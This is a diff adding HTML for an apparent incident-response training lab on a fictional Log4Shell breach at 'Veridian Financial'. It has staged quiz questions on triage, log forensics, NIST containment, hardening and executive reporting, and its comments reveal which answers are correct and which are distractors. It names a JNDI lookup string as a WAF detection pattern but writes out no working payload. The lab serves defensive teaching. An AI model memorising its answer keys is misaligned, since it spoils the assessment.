+                        <div class="alert-meta">SRC: 10.10.20.15 &nbsp; DST: 203.0.113.66:443 &nbsp; TIME: 2026-03-09 08:02:44 UTC &nbsp; BYTES: 4,509,715,660 &nbsp; RULE: FW-EXFIL-OUTBOUND</div>
+                    </div>
+                </label>
+                <div class="alert-feedback" id="fb-A7"></div>
+            </div>
+
+        </div>
+
+        <div class="actions">
+            <button class="btn" id="s1-submit" onclick="gradeStage1()">Submit Triage</button>
+            <button class="btn btn-secondary" onclick="resetStage(1)">Reset Stage</button>
+        </div>
+
+        <div class="stage-result" id="s1-result" role="status" aria-live="polite"></div>
+
+    </section>
+
+
+    <!-- ════════════════════════════════════════════════════════
+         STAGE 2 -- INVESTIGATE (LOG FORENSICS)
+         Log excerpts from Apache, auth.log, and firewall for 2026-03-09.
+         6 investigative questions with answers derivable from the logs.
+         Locked until Stage 1 is passed.
+    ════════════════════════════════════════════════════════ -->
+    <section class="stage-panel" id="stage-2" aria-labelledby="s2-heading">
+
+        <div class="locked-msg" id="s2-locked" role="status">
+            <div class="lock-icon" aria-hidden="true">[LOCKED]</div>
+            <p>Complete Stage 1 with a passing score to unlock Stage 2.</p>
+        </div>
+
+        <div id="s2-content" style="display:none;">
+            <div class="stage-header">
+                <div class="stage-num-badge" aria-hidden="true">2</div>
+                <div class="stage-header-text">
+                    <h2 id="s2-heading">Stage 2 -- Investigate: Log Forensics</h2>
+                    <p>Domain 4.3 -- Incident Response &nbsp;|&nbsp; Pass threshold: 80% (5 of 6 questions correct)</p>
+                </div>
+            </div>
+
+            <div class="stage-instructions">
+                The logs below were collected from WEB-DMZ-01 (10.10.10.20) and APP-INT-05 (10.10.20.15)
+                for 2026-03-09 UTC. Use the filter buttons to isolate each log source.
+                Answer the 6 forensic questions using ONLY what you can read in the logs.
+            </div>
+
+            <!-- Log viewer with filter controls -->
+            <div class="log-viewer" role="region" aria-label="Log data">
+                <div class="log-toolbar">
+                    <span>Log Console -- Veridian Financial &nbsp; 2026-03-09 UTC</span>
+                    <div class="filter-row" role="group" aria-label="Log filter">
+                        <button class="filter-btn active" onclick="filterLogs('all')" aria-pressed="true" id="flt-all">All</button>
+                        <button class="filter-btn" onclick="filterLogs('apache')" aria-pressed="false" id="flt-apache">Apache Access</button>
+                        <button class="filter-btn" onclick="filterLogs('auth')" aria-pressed="false" id="flt-auth">Auth Log</button>
+                        <button class="filter-btn" onclick="filterLogs('fw')" aria-pressed="false" id="flt-fw">Firewall</button>
+                    </div>
+                </div>
+                <div class="log-body" id="logBody" aria-label="Log entries" tabindex="0">
+                    <!-- Log lines are injected by JS to keep indentation clean -->
+                </div>
+            </div>
+
+            <!-- 6 forensic questions -->
+            <div id="s2-questions">
+
+                <div class="q-block" id="q2-1">
+                    <div class="q-num">Question 1 of 6</div>
+                    <div class="q-text">What was the entry vector -- the vulnerability that gave the attacker initial Remote Code Execution (RCE) on WEB-DMZ-01?</div>
+                    <div class="q-hint">Look at the Apache access log User-Agent field for the first attack request.</div>
+                    <div class="q-select">
+                        <select id="q2-1-sel" aria-label="Entry vector answer">
+                            <option value="">-- Select an answer --</option>
+                            <option value="a">SQL injection via the login form</option>
+                            <option value="b">Log4Shell (JNDI LDAP injection via User-Agent header exploiting CVE-2021-44228)</option>
+                            <option value="c">BlueKeep RDP exploit (CVE-2019-0708)</option>
+                            <option value="d">Directory traversal attack on the web server</option>
+                        </select>
+                    </div>
+                    <div class="q-feedback" id="fb-q2-1"></div>
+                </div>
+
+                <div class="q-block" id="q2-2">
+                    <div class="q-num">Question 2 of 6</div>
+                    <div class="q-text">What is the attacker's external IP address, as confirmed across the Apache log, auth log, and firewall log?</div>
+                    <div class="q-hint">The same source IP appears in all three log sources.</div>
+                    <div class="q-select">
+                        <select id="q2-2-sel" aria-label="Attacker IP answer">
+                            <option value="">-- Select an answer --</option>
+                            <option value="a">10.10.1.50</option>
+                            <option value="b">10.10.10.20</option>
+                            <option value="c">203.0.113.66</option>
+                            <option value="d">198.51.100.9</option>
+                        </select>
+                    </div>
+                    <div class="q-feedback" id="fb-q2-2"></div>
+                </div>
+
+                <div class="q-block" id="q2-3">
+                    <div class="q-num">Question 3 of 6</div>
+                    <div class="q-text">What is the exact path of the web shell the attacker deployed on WEB-DMZ-01, as shown in the Apache access log?</div>
+                    <div class="q-hint">Look for HTTP GET requests with a ?cmd= parameter after the exploit.</div>
+                    <div class="q-select">
+                        <select id="q2-3-sel" aria-label="Web shell path answer">
+                            <option value="">-- Select an answer --</option>
+                            <option value="a">/admin/config.jsp?cmd=</option>
+                            <option value="b">/var/www/app/uploads/status.jsp</option>
+                            <option value="c">/cgi-bin/shell.sh</option>
+                            <option value="d">/uploads/data/backup.jsp</option>
+                        </select>
+                    </div>
+                    <div class="q-feedback" id="fb-q2-3"></div>
+                </div>
+
+                <div class="q-block" id="q2-4">
+                    <div class="q-num">Question 4 of 6</div>
+                    <div class="q-text">Which account was used to perform lateral movement from WEB-DMZ-01 to APP-INT-05, as shown in the auth log?</div>
+                    <div class="q-hint">Look for SSH accepted authentication entries in the auth log.</div>
+                    <div class="q-select">
+                        <select id="q2-4-sel" aria-label="Compromised account answer">
+                            <option value="">-- Select an answer --</option>
+                            <option value="a">root</option>
+                            <option value="b">admin</option>
+                            <option value="c">svc-deploy</option>
+                            <option value="d">backup-agent</option>
+                        </select>
+                    </div>
+                    <div class="q-feedback" id="fb-q2-4"></div>
+                </div>
+
+                <div class="q-block" id="q2-5">
+                    <div class="q-num">Question 5 of 6</div>
+                    <div class="q-text">Which internal host was the destination of the lateral movement? Identify by hostname and IP address.</div>
+                    <div class="q-hint">Check the auth log sshd entries for the destination host receiving the connection.</div>
+                    <div class="q-select">
+                        <select id="q2-5-sel" aria-label="Lateral target answer">
+                            <option value="">-- Select an answer --</option>
+                            <option value="a">WEB-DMZ-01 / 10.10.10.20</option>
+                            <option value="b">DB-CORE-03 / 10.10.30.10</option>
+                            <option value="c">APP-INT-05 / 10.10.20.15</option>
+                            <option value="d">BACKUP-SRV / 10.10.99.5</option>
+                        </select>
+                    </div>
+                    <div class="q-feedback" id="fb-q2-5"></div>
+                </div>
+
+                <div class="q-block" id="q2-6">
+                    <div class="q-num">Question 6 of 6</div>
+                    <div class="q-text">
+                        According to the firewall log, how many bytes of data were transferred outbound from APP-INT-05
+                        to the external attacker IP? What does this volume represent?
+                    </div>
+                    <div class="q-hint">Find the FW EGRESS DENY/ALLOW line for APP-INT-05 outbound. The BYTES field is the key value.</div>
+                    <div class="q-select">
+                        <select id="q2-6-sel" aria-label="Exfiltration size answer">
+                            <option value="">-- Select an answer --</option>
+                            <option value="a">3,758,096,384 bytes (~3.5 GB) -- the nightly backup</option>
+                            <option value="b">4,509,715,660 bytes (~4.2 GB) -- likely customer PII exfiltration</option>
+                            <option value="c">524,288,000 bytes (~500 MB) -- a single compressed archive</option>
+                            <option value="d">10,485,760 bytes (~10 MB) -- reconnaissance data only</option>
+                        </select>
+                    </div>
+                    <div class="q-feedback" id="fb-q2-6"></div>
+                </div>
+
+            </div>
+
+            <div class="actions">
+                <button class="btn" id="s2-submit" onclick="gradeStage2()">Submit Investigation</button>
+                <button class="btn btn-secondary" onclick="resetStage(2)">Reset Stage</button>
+            </div>
+
+            <div class="stage-result" id="s2-result" role="status" aria-live="polite"></div>
+        </div>
+    </section>
+
+
+    <!-- ════════════════════════════════════════════════════════
+         STAGE 3 -- RESPOND (IR PLAYBOOK)
+         Students assign actions to the correct NIST 800-61 phase.
+         Containment -> Eradication -> Recovery (in order).
+         Wrong-phase distractors are included.
+         Locked until Stage 2 is passed.
+    ════════════════════════════════════════════════════════ -->
+    <section class="stage-panel" id="stage-3" aria-labelledby="s3-heading">
+
+        <div class="locked-msg" id="s3-locked" role="status">
+            <div class="lock-icon" aria-hidden="true">[LOCKED]</div>
+            <p>Complete Stage 2 with a passing score to unlock Stage 3.</p>
+        </div>
+
+        <div id="s3-content" style="display:none;">
+            <div class="stage-header">
+                <div class="stage-num-badge" aria-hidden="true">3</div>
+                <div class="stage-header-text">
+                    <h2 id="s3-heading">Stage 3 -- Respond: IR Playbook</h2>
+                    <p>Domain 4.3 -- Incident Response / NIST SP 800-61 &nbsp;|&nbsp; Pass threshold: 80%</p>
+                </div>
+            </div>
+
+            <div class="stage-instructions">
+                Below are three IR phase blocks: Containment, Eradication, and Recovery.
+                Select the actions that belong in EACH phase for THIS specific incident.
+                Actions must be phase-accurate and incident-specific. Evidence preservation
+                happens during Containment, before any destructive eradication steps.
+                Each block has distractors -- actions that belong to a different phase or are not applicable here.
+            </div>
+
+            <!-- CONTAINMENT phase -->
+            <div class="phase-block" id="pb-contain">
+                <h3><span class="phase-icon">PHASE 1</span> Containment -- Select ALL correct containment actions</h3>
+                <div class="action-list" role="group" aria-label="Containment actions">
+
+                    <!-- Correct containment actions -->
+                    <div class="action-item" id="ai-C1">
+                        <label>
+                            <input type="checkbox" id="ac-C1" aria-describedby="fb-C1">
+                            Network-isolate WEB-DMZ-01 (10.10.10.20) immediately -- sever external access while preserving the system for forensic imaging.
+                        </label>
+                        <div class="action-fb" id="fb-C1"></div>
+                    </div>
+                    <div class="action-item" id="ai-C2">
+                        <label>
+                            <input type="checkbox" id="ac-C2" aria-describedby="fb-C2">
+                            Network-isolate APP-INT-05 (10.10.20.15) to stop ongoing exfiltration and prevent further lateral spread.
+                        </label>
+                        <div class="action-fb" id="fb-C2"></div>
+                    </div>
+                    <div class="action-item" id="ai-C3">
+                        <label>
+                            <input type="checkbox" id="ac-C3" aria-describedby="fb-C3">
+                            Disable the svc-deploy service account in Active Directory to revoke the compromised credential.
+                        </label>
+                        <div class="action-fb" id="fb-C3"></div>
+                    </div>
+                    <div class="action-item" id="ai-C4">
+                        <label>
+                            <input type="checkbox" id="ac-C4" aria-describedby="fb-C4">
+                            Block inbound and outbound traffic to/from 203.0.113.66 on the perimeter firewall.
+                        </label>
+                        <div class="action-fb" id="fb-C4"></div>
+                    </div>
+                    <div class="action-item" id="ai-C5">
+                        <label>
+                            <input type="checkbox" id="ac-C5" aria-describedby="fb-C5">
+                            Preserve forensic evidence: capture full memory dumps and disk images of WEB-DMZ-01 and APP-INT-05 BEFORE any remediation activity.
+                        </label>
+                        <div class="action-fb" id="fb-C5"></div>
+                    </div>
+                    <!-- Distractor -- belongs in Eradication -->
+                    <div class="action-item" id="ai-C6">
+                        <label>
+                            <input type="checkbox" id="ac-C6" aria-describedby="fb-C6">
+                            Immediately delete /var/www/app/uploads/status.jsp from WEB-DMZ-01 to remove the web shell.
+                        </label>
+                        <div class="action-fb" id="fb-C6"></div>
+                    </div>
+                    <!-- Distractor -- belongs in Recovery -->
+                    <div class="action-item" id="ai-C7">
+                        <label>
+                            <input type="checkbox" id="ac-C7" aria-describedby="fb-C7">
+                            Restore WEB-DMZ-01 from the last known-good backup and return it to production.
+                        </label>
+                        <div class="action-fb" id="fb-C7"></div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- ERADICATION phase -->
+            <div class="phase-block" id="pb-erad">
+                <h3><span class="phase-icon">PHASE 2</span> Eradication -- Select ALL correct eradication actions</h3>
+                <div class="action-list" role="group" aria-label="Eradication actions">
+
+                    <!-- Correct eradication actions -->
+                    <div class="action-item" id="ai-E1">
+                        <label>
+                            <input type="checkbox" id="ac-E1" aria-describedby="fb-E1">
+                            Remove the web shell /var/www/app/uploads/status.jsp from WEB-DMZ-01 (after forensic imaging is complete).
+                        </label>
+                        <div class="action-fb" id="fb-E1"></div>
+                    </div>
+                    <div class="action-item" id="ai-E2">
+                        <label>
+                            <input type="checkbox" id="ac-E2" aria-describedby="fb-E2">
+                            Upgrade/patch Log4j to a non-vulnerable version (2.17.1+) on ALL affected hosts, starting with WEB-DMZ-01.
+                        </label>
+                        <div class="action-fb" id="fb-E2"></div>
+                    </div>
+                    <div class="action-item" id="ai-E3">
+                        <label>
+                            <input type="checkbox" id="ac-E3" aria-describedby="fb-E3">
+                            Reset the svc-deploy service account credentials and audit all systems where svc-deploy has been used.
+                        </label>
+                        <div class="action-fb" id="fb-E3"></div>
+                    </div>
+                    <div class="action-item" id="ai-E4">
+                        <label>
+                            <input type="checkbox" id="ac-E4" aria-describedby="fb-E4">
+                            Search for and remove all attacker persistence mechanisms: scheduled tasks, cron jobs, additional web shells, and unauthorized SSH authorized_keys entries.
+                        </label>
+                        <div class="action-fb" id="fb-E4"></div>
+                    </div>
+                    <!-- Distractor -- belongs in Containment -->
+                    <div class="action-item" id="ai-E5">
+                        <label>
+                            <input type="checkbox" id="ac-E5" aria-describedby="fb-E5">
+                            Block inbound and outbound traffic to/from 203.0.113.66 on the perimeter firewall.
+                        </label>
+                        <div class="action-fb" id="fb-E5"></div>
+                    </div>
+                    <!-- Distractor -- belongs in Recovery -->
+                    <div class="action-item" id="ai-E6">
+                        <label>
+                            <input type="checkbox" id="ac-E6" aria-describedby="fb-E6">
+                            Return APP-INT-05 to the production network and monitor it for 72 hours.
+                        </label>
+                        <div class="action-fb" id="fb-E6"></div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- RECOVERY phase -->
+            <div class="phase-block" id="pb-recov">
+                <h3><span class="phase-icon">PHASE 3</span> Recovery -- Select ALL correct recovery actions</h3>
+                <div class="action-list" role="group" aria-label="Recovery actions">
+
+                    <!-- Correct recovery actions -->
+                    <div class="action-item" id="ai-R1">
+                        <label>
+                            <input type="checkbox" id="ac-R1" aria-describedby="fb-R1">
+                            Restore WEB-DMZ-01 and APP-INT-05 from verified clean backups taken before the incident date (before 2026-03-09).
+                        </label>
+                        <div class="action-fb" id="fb-R1"></div>
+                    </div>
+                    <div class="action-item" id="ai-R2">
+                        <label>
+                            <input type="checkbox" id="ac-R2" aria-describedby="fb-R2">
+                            Validate that Log4j is patched, the web shell path returns 404, and svc-deploy privileges are scoped to least-privilege before reconnecting hosts to production.
+                        </label>
+                        <div class="action-fb" id="fb-R2"></div>
+                    </div>
+                    <div class="action-item" id="ai-R3">
+                        <label>
+                            <input type="checkbox" id="ac-R3" aria-describedby="fb-R3">
+                            Monitor WEB-DMZ-01 and APP-INT-05 with enhanced SIEM alerting and EDR coverage for at least 72 hours post-restoration.
+                        </label>
+                        <div class="action-fb" id="fb-R3"></div>
+                    </div>
+                    <!-- Distractor -- belongs in Eradication -->
+                    <div class="action-item" id="ai-R4">
+                        <label>
+                            <input type="checkbox" id="ac-R4" aria-describedby="fb-R4">
+                            Perform a full Log4j audit across the entire organization to identify all other vulnerable instances.
+                        </label>
+                        <div class="action-fb" id="fb-R4"></div>
+                    </div>
+                    <!-- Distractor -- not applicable to this incident -->
+                    <div class="action-item" id="ai-R5">
+                        <label>
+                            <input type="checkbox" id="ac-R5" aria-describedby="fb-R5">
+                            Require all employees to change their passwords immediately as a recovery measure.
+                        </label>
+                        <div class="action-fb" id="fb-R5"></div>
+                    </div>
+
+                </div>
+            </div>
+
+            <div class="actions">
+                <button class="btn" id="s3-submit" onclick="gradeStage3()">Submit IR Playbook</button>
+                <button class="btn btn-secondary" onclick="resetStage(3)">Reset Stage</button>
+            </div>
+
+            <div class="stage-result" id="s3-result" role="status" aria-live="polite"></div>
+        </div>
+    </section>
+
+
+    <!-- ════════════════════════════════════════════════════════
+         STAGE 4 -- REMEDIATE (ROOT CAUSE + HARDENING)
+         Students identify the root cause CVE and select the hardening
+         controls that close THIS specific attack path.
+         Locked until Stage 3 is passed.
+    ════════════════════════════════════════════════════════ -->
+    <section class="stage-panel" id="stage-4" aria-labelledby="s4-heading">
+
+        <div class="locked-msg" id="s4-locked" role="status">
+            <div class="lock-icon" aria-hidden="true">[LOCKED]</div>
+            <p>Complete Stage 3 with a passing score to unlock Stage 4.</p>
+        </div>
+
+        <div id="s4-content" style="display:none;">
+            <div class="stage-header">
+                <div class="stage-num-badge" aria-hidden="true">4</div>
+                <div class="stage-header-text">
+                    <h2 id="s4-heading">Stage 4 -- Remediate: Root Cause and Hardening</h2>
+                    <p>Domain 4.4 -- Vulnerability Management / Domain 5.1 -- Policies &nbsp;|&nbsp; Pass threshold: 80%</p>
+                </div>
+            </div>
+
+            <div class="stage-instructions">
+                Identify the root cause of the breach and select every hardening control that
+                directly addresses this specific attack path. A control must actually close or
+                significantly impede a step in the kill chain to be selected.
+                Plausible-sounding but ineffective controls are included as distractors.
+            </div>
+
+            <!-- Root cause identification -->
+            <div class="sub-label">Part A -- Root Cause Identification (select one)</div>
+            <div class="radio-group" id="s4-rc" role="radiogroup" aria-label="Root cause selection">
+
+                <div class="radio-item" id="ri-rc1">
+                    <input type="radio" name="rootcause" id="rc1" value="rc1">
+                    <label for="rc1">Weak password on the svc-deploy service account allowed brute-force login via SSH.</label>
+                </div>
+                <div class="radio-item" id="ri-rc2">
+                    <input type="radio" name="rootcause" id="rc2" value="rc2">
+                    <label for="rc2">An unpatched Log4j library (CVE-2021-44228, CVSS v3.1 10.0 Critical) on WEB-DMZ-01 allowed remote code execution via a JNDI LDAP injection string in the HTTP User-Agent header.</label>
+                </div>
+                <div class="radio-item" id="ri-rc3">
+                    <input type="radio" name="rootcause" id="rc3" value="rc3">
+                    <label for="rc3">A misconfigured firewall rule allowed unrestricted inbound traffic from the internet to all internal hosts.</label>
+                </div>
+                <div class="radio-item" id="ri-rc4">
+                    <input type="radio" name="rootcause" id="rc4" value="rc4">
+                    <label for="rc4">An SQL injection vulnerability in the Veridian Financial web application login form allowed database extraction.</label>
+                </div>
+
+            </div>
+
+            <!-- Hardening controls -->
+            <div class="sub-label">Part B -- Select ALL hardening controls that directly close this attack path</div>
+            <div class="check-group" id="s4-controls" role="group" aria-label="Hardening controls">
+
+                <!-- Correct controls -->
+                <div class="check-item" id="ci-H1">
+                    <input type="checkbox" id="hc1" aria-describedby="fb-hc1">
+                    <label for="hc1">Patch/upgrade Log4j to version 2.17.1 or later on all systems, eliminating CVE-2021-44228.</label>
+                    <div class="check-fb" id="fb-hc1"></div>
+                </div>
+                <div class="check-item" id="ci-H2">
+                    <input type="checkbox" id="hc2" aria-describedby="fb-hc2">
+                    <label for="hc2">Deploy a WAF rule that blocks JNDI lookup strings (${jndi:...}) in all HTTP headers and request bodies.</label>
+                    <div class="check-fb" id="fb-hc2"></div>
+                </div>
+                <div class="check-item" id="ci-H3">
+                    <input type="checkbox" id="hc3" aria-describedby="fb-hc3">
+                    <label for="hc3">
+                        Implement egress filtering on the DMZ: block all outbound connections from WEB-DMZ-01
+                        except to explicitly approved destinations and ports. This would have blocked the outbound LDAP callback
+                        to 203.0.113.66:1389 (killing the exploit at step 2) AND the 4.2 GB exfil from APP-INT-05.
+                    </label>
+                    <div class="check-fb" id="fb-hc3"></div>
+                </div>
+                <div class="check-item" id="ci-H4">
+                    <input type="checkbox" id="hc4" aria-describedby="fb-hc4">
+                    <label for="hc4">Apply least-privilege to svc-deploy: scope its permissions to only the services it needs; remove SSH login rights between DMZ and internal network segments.</label>
+                    <div class="check-fb" id="fb-hc4"></div>
+                </div>
+                <div class="check-item" id="ci-H5">
+                    <input type="checkbox" id="hc5" aria-describedby="fb-hc5">
+                    <label for="hc5">Remove execute permissions from the web application's upload directory (/var/www/app/uploads/) so uploaded files cannot be executed as server-side scripts.</label>
+                    <div class="check-fb" id="fb-hc5"></div>
+                </div>
+                <div class="check-item" id="ci-H6">
+                    <input type="checkbox" id="hc6" aria-describedby="fb-hc6">
+                    <label for="hc6">Enforce network segmentation: place WEB-DMZ-01 in a hardened DMZ with firewall rules that prevent direct SSH access from DMZ hosts to the internal application network.</label>
+                    <div class="check-fb" id="fb-hc6"></div>
+                </div>
+
+                <!-- Distractors -->
+                <div class="check-item" id="ci-H7">
+                    <input type="checkbox" id="hc7" aria-describedby="fb-hc7">
+                    <label for="hc7">Force a company-wide password reset for all employees immediately. This alone closes the Log4Shell entry vector.</label>
+                    <div class="check-fb" id="fb-hc7"></div>
+                </div>
+                <div class="check-item" id="ci-H8">
+                    <input type="checkbox" id="hc8" aria-describedby="fb-hc8">
+                    <label for="hc8">Deploy antivirus software on all end-user workstations to prevent future web shell deployments on servers.</label>
+                    <div class="check-fb" id="fb-hc8"></div>
+                </div>
+
+            </div>
+
+            <div class="actions">
+                <button class="btn" id="s4-submit" onclick="gradeStage4()">Submit Remediation Plan</button>
+                <button class="btn btn-secondary" onclick="resetStage(4)">Reset Stage</button>
+            </div>
+
+            <div class="stage-result" id="s4-result" role="status" aria-live="polite"></div>
+        </div>
+    </section>
+
+
+    <!-- ════════════════════════════════════════════════════════
+         STAGE 5 -- REPORT & GOVERN (RISK + EXECUTIVE REPORT)
+         Students rate residual risk, apply risk treatments, and assemble
+         the executive incident report by selecting correct statements.
+         Locked until Stage 4 is passed.
+    ════════════════════════════════════════════════════════ -->
+    <section class="stage-panel" id="stage-5" aria-labelledby="s5-heading">
+
+        <div class="locked-msg" id="s5-locked" role="status">
+            <div class="lock-icon" aria-hidden="true">[LOCKED]</div>
+            <p>Complete Stage 4 with a passing score to unlock Stage 5.</p>
+        </div>
+
+        <div id="s5-content" style="display:none;">
+            <div class="stage-header">
+                <div class="stage-num-badge" aria-hidden="true">5</div>
+                <div class="stage-header-text">
+                    <h2 id="s5-heading">Stage 5 -- Report and Govern: Risk and Executive Reporting</h2>
+                    <p>Domain 5.1 -- Security Program Management / Domain 5.4 -- Risk Management &nbsp;|&nbsp; Pass threshold: 80%</p>
+                </div>
+            </div>
+
+            <div class="stage-instructions">
+                The containment and eradication are complete. Now you must close out the incident formally.
+                Part A: Assign a risk treatment to each residual risk.
+                Part B: Assemble the executive incident report by selecting ONLY the accurate, appropriate statements.
+                Inaccurate or misleading statements are included -- a good Incident Commander never lets bad data into the executive report.
+            </div>
+
+            <!-- Part A: Risk treatment assignments -->
+            <div class="sub-label">Part A -- Assign a Risk Treatment to Each Residual Risk</div>
+            <p style="font-size:0.83rem; color:var(--muted); margin-bottom:14px;">
+                Treatments: Mitigate (reduce likelihood/impact with controls), Transfer (shift risk via insurance/contracts),
+                Avoid (eliminate the activity creating the risk), Accept (acknowledge and monitor with no further action).
+            </p>
+
+            <table class="risk-table" id="s5-risk-table" aria-label="Residual risk treatment assignments">
+                <thead>
+                    <tr>
+                        <th>Residual Risk</th>
+                        <th>Assign Treatment</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <!-- Risk 1: Other Log4j instances -- correct = Mitigate -->
+                    <tr id="rt-row-1">
+                        <td>Other Log4j-vulnerable applications may exist elsewhere in the Veridian Financial environment, creating additional unpatched RCE exposure.</td>
+                        <td>
+                            <select id="rt1-sel" aria-label="Treatment for Log4j risk">
+                                <option value="">-- Select --</option>
+                                <option value="Mitigate">Mitigate</option>
+                                <option value="Transfer">Transfer</option>
+                                <option value="Avoid">Avoid</option>
+                                <option value="Accept">Accept</option>
+                            </select>
+                        </td>
+                    </tr>
+                    <!-- Risk 2: PII regulatory exposure -- correct = Transfer -->
+                    <tr id="rt-row-2">
+                        <td>The exfiltrated ~4.2 GB of customer PII may trigger regulatory fines and litigation. Veridian Financial carries a cyber liability insurance policy covering data breach costs.</td>
+                        <td>
+                            <select id="rt2-sel" aria-label="Treatment for PII regulatory risk">
+                                <option value="">-- Select --</option>
+                                <option value="Mitigate">Mitigate</option>
+                                <option value="Transfer">Transfer</option>
+                                <option value="Avoid">Avoid</option>
+                                <option value="Accept">Accept</option>
+                            </select>
+                        </td>
+                    </tr>
+                    <!-- Risk 3: svc-deploy over-privilege -- correct = Mitigate -->
+                    <tr id="rt-row-3">
+                        <td>The svc-deploy account pattern (over-privileged service accounts) remains a systemic risk if other service accounts also have excessive cross-segment SSH access.</td>
+                        <td>
+                            <select id="rt3-sel" aria-label="Treatment for service account risk">
+                                <option value="">-- Select --</option>
+                                <option value="Mitigate">Mitigate</option>
+                                <option value="Transfer">Transfer</option>
+                                <option value="Avoid">Avoid</option>
+                                <option value="Accept">Accept</option>
+                            </select>
+                        </td>
+                    </tr>
+                    <!-- Risk 4: Reputational / customer notification -- correct = Accept (with plan) -->
+                    <tr id="rt-row-4">
+                        <td>Reputational damage from public disclosure of the breach is unavoidable given regulatory notification requirements. A communications plan is already drafted.</td>
+                        <td>
+                            <select id="rt4-sel" aria-label="Treatment for reputational risk">
+                                <option value="">-- Select --</option>
+                                <option value="Mitigate">Mitigate</option>
+                                <option value="Transfer">Transfer</option>
+                                <option value="Avoid">Avoid</option>
+                                <option value="Accept">Accept</option>
+                            </select>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <!-- Risk feedback block -->
+            <div id="s5-risk-fb" style="display:none; margin-bottom:18px; font-size:0.84rem; color:var(--muted); line-height:1.65;"></div>
+
+            <!-- Part B: Executive incident report assembly -->
+            <div class="sub-label">Part B -- Assemble the Executive Incident Report</div>
+            <p style="font-size:0.83rem; color:var(--muted); margin-bottom:14px;">
+                Select ONLY the statements that belong in an accurate executive incident report for this breach.
+                Inaccurate, misleading, or incomplete statements must NOT be selected.
+            </p>
+
+            <div class="report-statements" id="s5-report-stmts" role="group" aria-label="Executive report statements">
+
+                <!-- Correct report statements (6 correct, 4 distractors) -->
+                <div class="rpt-item" id="rpt-S1">
+                    <input type="checkbox" id="rs1" aria-describedby="fb-rs1">
+                    <label for="rs1">Root Cause: An unpatched Log4j library (CVE-2021-44228, CVSS 10.0) on WEB-DMZ-01 (10.10.10.20) allowed unauthenticated remote code execution via a JNDI LDAP injection string in the HTTP User-Agent header.</label>
+                    <div class="rpt-fb" id="fb-rs1"></div>
+                </div>
+                <div class="rpt-item" id="rpt-S2">
+                    <input type="checkbox" id="rs2" aria-describedby="fb-rs2">
+                    <label for="rs2">Attack Entry Point: Internet-facing web/application server WEB-DMZ-01 (10.10.10.20). Initial external attacker IP: 203.0.113.66.</label>
+                    <div class="rpt-fb" id="fb-rs2"></div>
+                </div>
+                <div class="rpt-item" id="rpt-S3">
+                    <input type="checkbox" id="rs3" aria-describedby="fb-rs3">
+                    <label for="rs3">Data Impact: Approximately 4.2 GB (4,509,715,660 bytes) of customer PII was exfiltrated from APP-INT-05 (10.10.20.15) to the attacker's external IP over HTTPS/443.</label>
+                    <div class="rpt-fb" id="fb-rs3"></div>
+                </div>
+                <div class="rpt-item" id="rpt-S4">
+                    <input type="checkbox" id="rs4" aria-describedby="fb-rs4">
+                    <label for="rs4">Lateral Movement Factor: The over-privileged service account svc-deploy, which had unrestricted SSH access across network segments, enabled the attacker to pivot from WEB-DMZ-01 to APP-INT-05 after harvesting credentials via the web shell.</label>
+                    <div class="rpt-fb" id="fb-rs4"></div>
+                </div>
+                <div class="rpt-item" id="rpt-S5">
+                    <input type="checkbox" id="rs5" aria-describedby="fb-rs5">
+                    <label for="rs5">Key Control Failure: The absence of egress filtering on the DMZ allowed both the outbound LDAP callback (completing the Log4Shell exploit) and the 4.2 GB data exfiltration. Egress filtering was the single control that would have disrupted the attack at two separate kill-chain stages.</label>
+                    <div class="rpt-fb" id="fb-rs5"></div>
+                </div>
+                <div class="rpt-item" id="rpt-S6">
+                    <input type="checkbox" id="rs6" aria-describedby="fb-rs6">
+                    <label for="rs6">Recommended Actions: (1) Patch Log4j organization-wide; (2) Implement DMZ egress filtering; (3) Apply least-privilege to all service accounts; (4) Remove execute rights from upload directories; (5) Engage cyber liability coverage for regulatory notification costs.</label>
+                    <div class="rpt-fb" id="fb-rs6"></div>
+                </div>
+
+                <!-- Distractor statements (inaccurate or misleading) -->
+                <div class="rpt-item" id="rpt-S7">
+                    <input type="checkbox" id="rs7" aria-describedby="fb-rs7">
+                    <label for="rs7">Root Cause: A weak password on the svc-deploy account allowed the attacker to brute-force SSH access directly into APP-INT-05 from the internet.</label>
+                    <div class="rpt-fb" id="fb-rs7"></div>
+                </div>
+                <div class="rpt-item" id="rpt-S8">
+                    <input type="checkbox" id="rs8" aria-describedby="fb-rs8">
+                    <label for="rs8">Data Impact: Approximately 3.5 GB of customer data was lost, all originating from the WEB-DMZ-01 server.</label>
+                    <div class="rpt-fb" id="fb-rs8"></div>
+                </div>
+                <div class="rpt-item" id="rpt-S9">
+                    <input type="checkbox" id="rs9" aria-describedby="fb-rs9">
+                    <label for="rs9">Key Finding: The attacker gained initial access by exploiting an SQL injection vulnerability in the Veridian Financial customer portal login form.</label>
+                    <div class="rpt-fb" id="fb-rs9"></div>
+                </div>
+                <div class="rpt-item" id="rpt-S10">
+                    <input type="checkbox" id="rs10" aria-describedby="fb-rs10">
+                    <label for="rs10">Recommended Action: Implement a company-wide password reset as the primary remediation for the Log4Shell root cause.</label>
+                    <div class="rpt-fb" id="fb-rs10"></div>
+                </div>
+
+            </div>
+
+            <div class="actions">
+                <button class="btn" id="s5-submit" onclick="gradeStage5()">Submit Final Report</button>
+                <button class="btn btn-secondary" onclick="resetStage(5)">Reset Stage</button>
+            </div>
+
+            <div class="stage-result" id="s5-result" role="status" aria-live="polite"></div>
+        </div>
+    </section>
+
+
+    <!-- ════════════════════════════════════════════════════════
+         FINAL REPORT CARD
+         Shown only after all 5 stages are passed.
+         Displays per-stage scores, overall grade, and Mark Complete button.
+    ════════════════════════════════════════════════════════ -->
+    <div class="report-card" id="reportCard" role="region" aria-label="Final Incident Report Card">
+        <h2>Incident Report Card</h2>
+        <p class="rc-subtitle">Operation Blackout -- Veridian Financial -- 2026-03-09 -- Final Assessment</p>
+
+        <div class="rc-grid" id="rcGrid">
+            <!-- Populated by JS when all 5 stages are complete -->
+        </div>
+
+        <div class="overall-grade" id="overallGrade" aria-label="Overall grade"></div>
+        <div class="overall-label" id="overallLabel"></div>
+
+        <div class="complete-section">
+            <!-- Mark Complete button -- calls ModuleProgress.complete with exact required signature -->
+            <button class="btn btn-ok" onclick="ModuleProgress.complete('shield','shield-capstone-breach-response',{returnUrl:'../index.html'})">
+                Mark Complete
+            </button>
+        </div>
+    </div>
+
